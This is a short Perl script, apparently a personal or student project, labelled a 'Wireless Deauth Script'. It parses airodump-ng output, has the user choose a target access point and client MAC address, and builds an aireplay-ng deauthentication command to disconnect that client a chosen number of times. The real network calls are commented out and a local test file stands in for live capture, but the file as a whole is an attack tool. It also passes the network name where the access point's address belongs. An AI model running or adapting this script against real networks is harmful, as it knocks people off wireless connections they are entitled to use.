#/user/bin/perl -w
#Jon Barber
#Wireless Deauth Script

use strict;
my $AP;  			#The ESSID of your target
my $BSSID;  		#The BSSID of your target
my $user;    		#The MAC Address of your target
my %APs;    		#dictionary BSSID:ESSID
my %users;  		#dictionary STATION:BSSID
my @ESSIDlist;	#List of ESSIDs
my @userlist;		#List of users on a specified AP

sub apsub {
	if(@ESSIDlist==0){
		print "Sorry, no AP's were found\n";
		exit;
	}
	print "Here are the available AP's\n\n";
	for(my $i=1;$i<@ESSIDlist;$i++){
		print "$i\. $ESSIDlist[$i]\n";
	}
	print "\nWhich AP would you like to target? (Choose number): ";
	chomp (my $choice = <>);
	while($choice>@ESSIDlist){
		print "Please pick a valid number: ";
		chomp($choice = <>);
	}
	$AP= $ESSIDlist[$choice];
	for(keys(%APs)){
		if($APs{$_}eq$AP){
			$BSSID=$_;
		}
	}
}

sub usersub {
	@userlist=[]; #reset the list
	for (keys(%users)){
		if($users{$_}eq$BSSID){
			push @userlist, $_;
			}
	}
	if(@userlist==1){
		print "\nSorry, no users on this AP, quitting\n";
		exit;
	}
	print "\nHere are the users for $AP:\n";
	for(my $i=1;$i<@userlist;$i++){
		print "$i\. $userlist[$i]\n";
	}
	print "Which user would you like to target? (Choose number): ";
	chomp(my $choice = <>);
	while($choice>@userlist){
		print "Please pick a valid number or 99 to return: ";
		chomp($choice = <>);
		if($choice==99){
			main();
		}
	}
	$user = $userlist[$choice];
}

sub main {
	apsub();
	usersub();
}

#Set the NIC to monitor mode
print "Configuring the NIC...\n";
#system "airmon-ng stop wlan0";
#system "airmon-ng start wlan0";
#system "ifconfig wlan0 up";
print "NIC configured!\n";


################
#For testing purposes##
################
open FILE, 'C:\Users\Jon\Dropbox\my_code\RC3 Scripts\DeAuth\dump.txt';
my @dump;
while(<FILE>){
	push @dump, $_;
}
close(FILE);
################

@ESSIDlist=[];

#my @dump = `airodump-ng mon0`;

for(@dump){
	if($_=~/^\s*(..:..:..:..:..:..)\s+\d\d .*?(\w+)\s*$/){
		$APs{$1} = $2;
		push @ESSIDlist, $2;
	}
	if($_=~/(..:..:..:..:..:..) +(..:..:..:..:..:..)/){
		$users{$2} = $1;
	}
}


main();

print "Number of times to Deauthenticate them: ";
chomp (my $num =<>);

print "Attempting to deaunthenticate $user on $AP $num times\n";

my $call = "aireplay-ng -0 ".$num." -a ".$AP." -c ".$user." mon0";
print "$call\n";
#system "$call"


print "Done.\n";